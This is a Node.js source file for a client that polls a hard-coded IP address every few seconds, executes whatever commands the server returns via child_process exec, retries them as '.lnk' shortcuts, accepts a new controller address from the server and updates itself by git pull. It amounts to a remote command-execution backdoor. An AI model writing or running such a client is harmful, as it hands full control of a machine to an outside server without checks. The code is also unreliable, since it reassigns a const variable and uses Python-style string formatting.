const request = require('request');
const exec = require('child_process').exec;
const build_in = require('./build_in');
const fs = require('fs');

const host = 'http://45.32.41.191:81';
const name = 'pc';

function initHost() {
    if(fs.existsSync('host')) {
        host = fs.readFileSync('host');
    }
    else {
        fs.writeFileSync('host', host);
    }
}

function get(url, callback){
    request.get({
        url:url,
        encoding: null,
        followRedirect: false,
        time: false,
        forever: true
    }, callback);
}

function telcmd(cmd, name){
    get(host + '/telcmd?cmd=' + cmd + '&name=' + name, function (error, response, buf) {
    });
}

// change name to your client name
function flush(){
    console.log('~');
    get(host + '/flush?name=' + name, async function (error, response, buf) {
        if(!buf) return;
        let json = new Buffer(buf).toString();
        let cmd_buffer = await JSON.parse(json)['cmd_buffer'];
        for(let i = 0; i < cmd_buffer.length; i++){
            let item = cmd_buffer[i];
            let cmd = item.cmd;
            if(cmd){
                if(await build_in.exec(item)){
                    console.log('build-in: ', cmd);
                }
                else{
                    console.log(cmd);
                    exec(cmd, function(err, stdout, stderr) {
                        console.log('stdout: %s' % stdout);
                    });
                    // run link file automatic
                    if(!cmd.endsWith('.lnk')){
                        exec(cmd+'.lnk', function(err, stdout, stderr) {
                            console.log('stdout: %s' % stdout);
                        });
                    }
                }
            }
        }
    });
}

function resetHost() {
    get(host + '/host', async function (error, response, buf) {
        if(!buf) return;
        let newHost = new Buffer(buf).toString();
        if(newHost != host) {
            host = newHost;
            fs.writeFileSync('host', host);
        }
    });
}

function updateCode() {
    exec('git pull', function(err, stdout, stderr) {
        console.log('update code: %s' % stdout);
    });
}

function deamon(){
    setImmediate(flush);
    setInterval(flush, 3000);
    setInterval(resetHost, 60 * 60 * 1000);
    setInterval(updateCode, 3 * 60 * 60 * 1000);
}

if (require.main === module) {
    initHost();
    deamon();
}

module.exports = {
    telcmd: telcmd,
    flush: flush
};
